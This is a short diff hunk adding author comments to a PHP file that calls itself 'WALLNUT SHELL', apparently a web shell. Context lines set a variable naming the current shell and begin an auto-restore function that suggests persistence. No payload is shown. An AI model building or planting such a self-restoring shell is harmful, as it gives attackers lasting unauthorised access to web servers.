@@ -1,4 +1,6 @@
 <?php
+//WALLNUT SHELL - By Dkid03
+// Don't CHANGE THE AUTHOR 
 $CURRENT_SHELL = basename(__FILE__);
 
 function auto_restore_by_name() {
